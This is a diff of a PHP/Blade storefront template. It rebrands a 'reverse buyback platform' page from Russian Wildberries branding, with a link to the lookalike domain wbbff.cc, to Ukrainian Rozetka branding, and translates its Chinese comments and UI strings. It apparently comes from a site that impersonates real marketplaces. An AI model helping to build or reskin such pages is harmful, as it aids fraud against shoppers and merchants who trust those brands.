@@ -12,12 +12,12 @@
 	</style>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-	<title>собрать - Wildberries</title>
-	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
+	<title>зібрати - Rozetka</title>
+	<meta name="keywords" content="Платформа зворотного викупу для українських торговців">
 	<meta name="description"
-		content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+		content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
 	<meta name="format-detection" content="telephone=no">
-	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">
 	<script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
@@ -28,15 +28,15 @@
 <body>
 	<div class="pagetop">
 		<div class="fh"><a href="<?php  echo route("profile") ?>"></a></div>
-		<div>собрать</div>
+		<div>зібрати</div>
 		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
 		<!-- 
 <div class="top_menu" id="top_menu">
 	<ul>
-	<li><a href="<?php  echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
+	<li><a href="<?php  echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
 	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
-	<li><a href="<?php  echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
-	<li><a href="<?php  echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
+	<li><a href="<?php  echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
+	<li><a href="<?php  echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
 	</ul>
 	<div class="clear"></div>
 </div> -->
@@ -49,13 +49,13 @@
 					src="{{ !empty($favorite->images) && !empty($favorite->images[0]) ? asset('storage/' . $favorite->images[0]) : asset('assets/default.png') }}"></a></div>
 					<div class="dingdan_name" style="margin-right:0">
 						<p><a href="{{route("product", $favorite->id)}}">{{$favorite->name}}</a></p>
-						<div class="num corg mat5">₾{{$favorite->price}}</div>
+						<div class="num corg mat5">₴{{$favorite->price}}</div>
 					</div>
 				</div>
 				<div class="fl mat10 cbbb font12">{{$favorite->created_at}}</div>
 				<div class="fr mat8">
-					<a href="{{ route("product.favorite.delete", $favorite->id)}}" onclick="return app_delinfo(this, 'Удали это?')"
-						class="edit_btn">удалить</a>
+					<a href="{{ route("product.favorite.delete", $favorite->id)}}" onclick="return app_delinfo(this, 'Видалити це?')"
+						class="edit_btn">видалити</a>
 				</div>
 				<div class="clear"></div>
 			</div>
@@ -68,7 +68,7 @@
 	<script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
 	<script type="text/javascript">
-		//顶部菜单点击
+		//клік верхнього меню
 		function top_menu() {
 			if ($("#top_menu").is(":hidden")) {
 				$("#top_menu").show();
@@ -85,13 +85,13 @@
 	<script>
 		function confirm_huigou(order_id) {
 			layer.open({
-				content: "Определить выкуп этого Заказ？",
-				btn: ["OK", "Отмена"],
+				content: "Визначити викуп цього Замовлення？",
+				btn: ["OK", "Скасувати"],
 				shadeClose: false,
 				yes: function () {
 
 					/*layer.open({
-						content: '你点了确认',
+						content: 'ви натиснули підтвердити',
 						time: 1
 					});*/
 					$.ajax({
